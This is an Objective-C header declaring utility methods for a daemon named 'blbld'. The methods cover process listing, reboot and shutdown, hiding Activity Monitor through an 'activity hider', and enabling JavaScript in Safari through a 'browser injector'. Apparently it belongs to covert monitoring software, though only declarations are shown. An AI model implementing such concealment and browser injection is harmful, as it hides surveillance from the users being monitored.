//
//  blbldUtils.h
//  blbld
//
//  Created by Makara Khloth on 2/18/15.
//
//

#import <Foundation/Foundation.h>

#import "DefStd.h"

@interface blbldUtils : NSObject
+ (NSString *) userLogonName;
+ (NSArray *) getRunnigProcesses;
+ (NSString *) pathOfPID: (int) aPID;
+ (void) reboot;
+ (void) shutdown;
+ (BOOL) isActivityMonitorIsRunning;
+ (void) hideActivityMonitor:  (NSString *) aActivityHiderPath;
+ (BOOL) isSafariIsRunning;
+ (void) allowJavaScriptInSafari:  (NSString *) aBrowserInjectorPath;
@end
